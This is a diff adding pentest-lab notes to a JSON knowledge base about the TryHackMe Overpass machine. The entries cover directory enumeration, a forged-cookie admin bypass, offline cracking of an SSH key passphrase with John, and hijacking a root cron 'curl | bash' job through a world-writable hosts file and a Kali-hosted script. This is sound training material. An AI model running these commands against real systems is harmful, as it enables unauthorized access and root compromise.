+        "HTTP",
+        "enumeration"
+      ],
+      "examples": [
+        {
+          "title": "Search for web paths",
+          "language": "bash",
+          "code": "gobuster dir -u http://<TARGET_IP>/ -w <WORDLIST>",
+          "explanation": "I used a wordlist to discover a non-linked admin route."
+        }
+      ],
+      "options": [
+        {
+          "flag": "dir",
+          "meaning": "Directory and path enumeration mode",
+          "when": "Look for web routes"
+        },
+        {
+          "flag": "-u URL",
+          "meaning": "Base target URL",
+          "when": "Point to the authorized application"
+        },
+        {
+          "flag": "-w FILE",
+          "meaning": "Wordlist file",
+          "when": "Select candidate paths"
+        }
+      ]
+    },
+    {
+      "id": "tool-john",
+      "title": "John the Ripper / ssh2john.py",
+      "category": "Tools",
+      "kind": "tools",
+      "date": "2026-11-12",
+      "summary": "Test candidate passphrases against encrypted SSH key data offline.",
+      "content": "I found an encrypted SSH private key in Overpass. I used `ssh2john.py` to convert its encryption metadata into input John accepts, then tested a common wordlist with John. A match was recovered and I used that passphrase to unlock the SSH key. I do not record the actual passphrase. The attack was offline against a local key, not repeated SSH password attempts.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
+        "SSH",
+        "offline audit"
+      ],
+      "examples": [
+        {
+          "title": "Convert encrypted SSH private key",
+          "language": "bash",
+          "code": "python3 /usr/share/john/ssh2john.py <KEY_FILE> > <HASH_FILE>",
+          "explanation": "Create John-compatible encrypted-key data; this doesn't crack the password."
+        },
+        {
+          "title": "Test a candidate password list",
+          "language": "bash",
+          "code": "john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>\njohn --show <HASH_FILE>",
+          "explanation": "Test candidate passphrases offline and display matches."
+        }
+      ],
+      "options": [
+        {
+          "flag": "--wordlist=FILE",
+          "meaning": "Wordlist of candidate passphrases",
+          "when": "Offline password audit"
+        },
+        {
+          "flag": "--show",
+          "meaning": "Display recovered passphrases",
+          "when": "Check results"
+        }
+      ]
+    },
+    {
+      "id": "tool-curl",
+      "title": "curl",
+      "category": "Tools",
+      "kind": "tools",
+      "date": "2026-11-12",
+      "summary": "Fetch HTTP content and inspect what a remote command receives.",
+      "content": "I noticed the Overpass root cron line used `curl overpass.thm/downloads/src/buildscript.sh | bash`. I then tested whether the target could fetch a Kali-hosted script directly. A successful HTTP response does not prove the scheduled job executed it.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
+        "HTTP",
+        "cron"
+      ],
+      "examples": [
+        {
+          "title": "Test an authorized HTTP script URL",
+          "language": "bash",
+          "code": "curl -v http://<KALI_VPN_IP>/downloads/src/buildscript.sh",
+          "explanation": "I tested target-to-Kali connectivity and that the requested path returned my script."
+        }
+      ],
+      "options": [
+        {
+          "flag": "-v",
+          "meaning": "Show verbose request/connection details",
+          "when": "Troubleshoot connectivity"
+        }
+      ]
+    },
+    {
+      "id": "tool-python-http-server",
+      "title": "Python HTTP server",
+      "category": "Tools",
+      "kind": "tools",
+      "date": "2026-11-12",
+      "summary": "Serve static files from a local directory in a controlled lab.",
+      "content": "I hosted an Overpass test script on Kali using `python3 -m http.server 80`. Python serves files relative to the current working directory, so I created `downloads/src/buildscript.sh` beneath the server root. A request from Overpass confirmed the file was reachable.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
+        "HTTP",
+        "local server"
+      ],
+      "examples": [
+        {
+          "title": "Host a test script at the expected URL path",
+          "language": "bash",
+          "code": "mkdir -p ~/overpass-web/downloads/src\ncd ~/overpass-web\npython3 -m http.server 80",
+          "explanation": "Serve downloads/src/buildscript.sh from the chosen working directory; port 80 may require privileges/capabilities depending on local settings."
+        }
+      ],
+      "options": [
+        {
+          "flag": "-m http.server",
+          "meaning": "Run Python's simple HTTP server module",
+          "when": "Static file serving in a lab"
+        },
+        {
+          "flag": "80",
+          "meaning": "Listening TCP port",
+          "when": "Match the client URL without an explicit port"
+        }
+      ]
+    },
+    {
+      "id": "service-cron",
+      "title": "Cron / scheduled task execution",
+      "category": "Services",
+      "kind": "services",
+      "date": "2026-11-12",
+      "summary": "Cron executes commands on a schedule; execution identity and command inputs determine security impact.",
+      "content": "I inspected `/etc/crontab` after logging in to Overpass as `james`. The system-wide crontab specified both the schedule and the execution user. One task ran every minute as root and fetched `http://overpass.thm/downloads/src/buildscript.sh` through curl before piping the result to Bash. I recognized this as an attack point only after learning that `/etc/hosts` was world writable, allowing an unprivileged user to redirect the hostname.\n\nI confirmed the target could fetch a Kali-hosted test script but did not preserve a root callback. I distinguish controllable code input, privileged execution and final proof of impact.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
+        "Linux",
+        "cron",
+        "remote scripts"
+      ],
+      "techniques": [
+        {
+          "title": "Root cron fetch of attacker-controllable script",
+          "why": "Running remote script bytes as root trusts the source and hostname resolution.",
+          "approach": "I read /etc/crontab, used getent hosts and ls -l /etc/hosts, then served a matching HTTP path and tested reachability. Root execution is not yet verified in my notes.",
+          "tools": [
+            "tool-curl",
+            "tool-python-http-server"
+          ],
+          "attackPoints": [
+            "attack-overpass-cron-hosts"
+          ],
+          "sourceLabs": [
+            "tryhackme-overpass"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "attack-overpass-client-cookie",
+      "title": "Client-controlled cookie authentication bypass",
+      "category": "Attack points",
+      "kind": "attack-points",
+      "date": "2026-11-12",
+      "summary": "An arbitrary cookie granted access to the Overpass admin area without normal login.",
+      "content": "I discovered `/admin` via Gobuster, inspected the JavaScript used by the login page and saw it set a cookie on success. I then manually set a cookie with a random value and reloaded the protected page. It opened. I inferred the server wasn't adequately validating authenticated state. The issue was not password weakness; it was placing trust in a client-controlled value.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
+        "HTTP",
+        "cookies",
+        "authorization"
+      ],
+      "recognition": "Protected page redirects to login but login JavaScript writes a client-controlled cookie; arbitrary cookie state changes route access.",
+      "conditions": "The application must rely on an insufficiently validated client-controlled authentication marker.",
+      "validation": "I created an arbitrary cookie, reloaded /admin and observed protected content.",
+      "impact": "Unauthorized admin-page access, including exposure of an SSH key.",
+      "services": [
+        "service-http"
+      ],
+      "tools": [
+        "tool-gobuster"
+      ]
+    },
+    {
+      "id": "attack-overpass-exposed-key",
+      "title": "Exposed encrypted SSH key with weak passphrase",
+      "category": "Attack points",
+      "kind": "attack-points",
+      "date": "2026-11-12",
+      "summary": "The Overpass admin page exposed a usable private key whose passphrase matched a common wordlist.",
+      "content": "After accessing the admin page, I found an SSH private key for `james`. SSH initially rejected local file permissions; after `chmod 600`, it requested the key passphrase. I used `ssh2john.py` and John with rockyou.txt to recover a matching passphrase, then authenticated to the SSH account. I do not publish the recovered passphrase or private key.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
+        "SSH",
+        "key exposure",
+        "wordlist"
+      ],
+      "recognition": "A private key appears in a web-reachable resource; SSH indicates the key is encrypted.",
+      "conditions": "Private key material is available and its passphrase is weak enough to recover; matching public key is authorized for the target account.",
+      "validation": "I recovered one passphrase match in John and confirmed an SSH login as james.",
+      "impact": "Remote account access through exposed private-key material.",
+      "services": [
+        "service-http",
+        "service-ssh"
+      ],
+      "tools": [
+        "tool-john",
+        "tool-ssh"
+      ]
+    },
+    {
+      "id": "attack-overpass-cron-hosts",
+      "title": "World-writable hosts file + privileged cron curl|bash",
+      "category": "Attack points",
+      "kind": "attack-points",
+      "date": "2026-11-12",
+      "summary": "World-writable hostname mapping could redirect a root cron task that executes downloaded HTTP script content.",
+      "content": "I found a minutely root cron task that used `curl overpass.thm/downloads/src/buildscript.sh | bash`. `getent hosts overpass.thm` returned `127.0.0.1`; `ls -l /etc/hosts` returned `-rw-rw-rw-` owned by root. I could therefore edit the target's hostname mapping despite being `james`. I set up a matching web path on Kali and verified the target could download its test script. I studied the root reverse-shell redirection. I have not provided final root execution proof.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
+        "Linux",
+        "cron",
+        "hostname resolution",
+        "privilege escalation"
+      ],
+      "recognition": "System-wide crontab runs a network-fetched script under root, while the hostname mapping used to reach that script is writable by unprivileged users.",
+      "conditions": "Target must resolve the hostname through a user-editable mapping, reach the substitute HTTP host, and execute fetched content through privileged Bash.",
+      "validation": "I confirmed the root crontab text, 127.0.0.1 name resolution, /etc/hosts mode 666 and successful retrieval of a Kali-served file. Cron execution remains unverified.",
+      "impact": "Potential arbitrary root code execution by redirecting a trusted update-script fetch; final impact unconfirmed.",
+      "services": [
+        "service-cron",
+        "service-http"
+      ],
+      "tools": [
+        "tool-curl",
+        "tool-python-http-server"
       ]
     }
   ]
